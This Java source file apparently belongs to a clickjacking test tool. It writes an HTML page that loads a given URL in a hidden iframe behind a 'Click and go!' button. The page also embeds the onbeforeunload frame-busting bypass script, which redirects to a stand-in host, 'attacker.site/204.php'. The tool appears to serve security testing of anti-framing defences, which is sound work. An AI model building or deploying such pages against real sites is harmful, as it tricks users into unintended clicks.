package com.dependability.clickjacking.creation.onBeforeUnloadEvent;

import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import com.dependability.clickjacking.clickInterface.ClickJacking;
import com.dependability.clickjacking.file.FileCustom;

public class OnBeforeUnloadEvent implements ClickJacking{

	private String src;
	private File f;
	
	public OnBeforeUnloadEvent(String src) throws IOException{
		this.src = src;
	    f = (new FileCustom("src/main/webapp/html_generated/onBeforeUnloadEvent.html")).getFile();

	}
	
	@Override
	public String getSrc() {
		return src;
	}
	
	@Override
	public void setSrc(String src) {
		this.src = src;
		
	}
	
	@Override
	public File getHtmlFile() {
		return f;
	}
	
	@Override
	public void setHtmlFile(File f) {
		this.f = f;
	}
	
	
	@Override
	public void creation() throws IOException {
        BufferedWriter bw = new BufferedWriter(new FileWriter(f));
        bw.write("<html><head>\r\n"
        		+ "<link rel=\"stylesheet\" href=\"CSS/opacity.css\">\r\n"
        		+ "    </head>\r\n"
        		+ "    <body>\r\n"
        		+ "        <div id=\"content\">\r\n"
        		+ "            <h1>Malicius Link</h1>\r\n"
        		+ "            <form action=\"http://www.owasp.com\">\r\n"
        		+ "                <input type=\"submit\" class=\"button\" value=\"Click and go!\">\r\n"
        		+ "            </form>");
        bw.write("<script>\r\n"
        		+ "		    var prevent_bust = 0;\r\n"
        		+ "		    window.onbeforeunload = function() {\r\n"
        		+ "		        prevent_bust++;\r\n"
        		+ "		    };\r\n"
        		+ "		    setInterval(\r\n"
        		+ "		        function() {\r\n"
        		+ "		            if (prevent_bust > 0) {\r\n"
        		+ "		                prevent_bust -= 2;\r\n"
        		+ "		                window.top.location = \"http://attacker.site/204.php\";\r\n"
        		+ "		            }\r\n"
        		+ "		        }, 1);\r\n"
        		+ "		</script>");
	    bw.write("<iframe src=\""+src+"\"  id=\"clickjacking\"  class=\"malicious\"></iframe>");
        bw.write("</body></html>");
        bw.close();		
	}
	
	@Override
	public void run() throws IOException {
		Desktop.getDesktop().browse(f.toURI());
	}
}

